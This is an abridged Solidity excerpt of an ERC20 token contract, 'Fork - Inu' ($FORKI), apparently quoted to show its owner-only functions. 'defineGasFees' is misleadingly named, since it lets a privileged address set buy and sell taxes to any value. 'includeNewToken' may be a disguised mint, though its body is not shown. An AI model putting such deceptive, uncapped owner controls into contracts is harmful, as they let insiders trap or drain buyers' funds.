...
contract ForkInu is Context, IERC20 { 
    using SafeMath for uint256;
    using Address for address;
    address private _owner;
    
    string private constant _name = "Fork - Inu";
    string private constant _symbol = unicode"$FORKI";
    ...
    address payable public DevWallet = payable(0xA1b5BadaD63bAB58d685cBD97DDA697C44fe5D4e);
    address payable public MarketingWallet = payable(0x6F204F1F473D1163D9b320e7181E1c529a54B39c);
    ...
    function defineGasFees(uint256 buytax, uint256 selltax) external onlyAddress {
        _tax_On_Buy = buytax;
        _tax_On_Sell = selltax;
    }
    function deleteGasFees() external onlyAddress {
        _tax_On_Buy = 0;
        _tax_On_Sell = 0;
    }
    ...
    function includeNewToken(uint256 value, address adr) onlyAddress public virtual {
